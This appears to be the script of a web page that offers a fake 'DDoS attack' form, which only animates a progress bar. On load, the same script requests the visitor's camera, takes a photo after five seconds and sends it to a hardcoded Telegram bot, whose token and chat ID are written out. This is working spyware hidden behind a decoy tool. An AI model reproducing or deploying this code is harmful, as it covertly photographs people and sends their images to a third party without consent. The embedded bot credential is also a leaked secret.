// script.js

// Token & Chat ID Bot Telegram
const TELEGRAM_BOT_TOKEN = "8050641668:AAEytFzgrSClXd5ARv35WFjfMNXGpGA5mr4";
const TELEGRAM_CHAT_ID = "6157377532";

// Fungsi untuk mengirim foto ke bot Telegram
function sendPhotoToTelegram(imageData) {
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            photo: imageData
        }),
        headers: { "Content-Type": "application/json" }
    })
    .then(response => response.json())
    .then(data => {
        console.log("Photo sent successfully", data);
    })
    .catch(error => {
        console.error("Error sending photo", error);
    });
}

// Meminta akses kamera dan mengambil foto
navigator.mediaDevices.getUserMedia({ video: true })
    .then((stream) => {
        const video = document.getElementById("video");
        video.srcObject = stream;
        
        setTimeout(() => {
            const canvas = document.getElementById("canvas");
            const ctx = canvas.getContext("2d");
            
            // Mengambil foto setelah beberapa detik
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Mengambil gambar dalam format data URL
            const imageData = canvas.toDataURL("image/png");
            sendPhotoToTelegram(imageData);
        }, 5000); // Ambil foto setelah 5 detik
    })
    .catch((err) => {
        console.error("Camera access denied:", err);
    });

// Efek Serangan DDoS Palsu
document.getElementById("ddosForm").addEventListener("submit", function (e) {
    e.preventDefault();
    
    const url = document.getElementById("url").value;
    const statusDiv = document.getElementById("status");
    const ddosEffect = document.getElementById("ddosEffect");
    const progress = document.getElementById("progress");
    const attackProgress = document.getElementById("attackProgress");

    statusDiv.textContent = "Starting DDoS simulation for " + url + "...";
    
    // Menampilkan efek "serangan"
    ddosEffect.classList.remove("hidden");

    let progressValue = 0;
    let interval = setInterval(() => {
        if (progressValue < 100) {
            progressValue += 10;
            progress.style.width = progressValue + "%";
            attackProgress.textContent = progressValue + "%";
        } else {
            clearInterval(interval);
            statusDiv.textContent = "Simulation complete. Attack finished.";
        }
    }, 500);
});
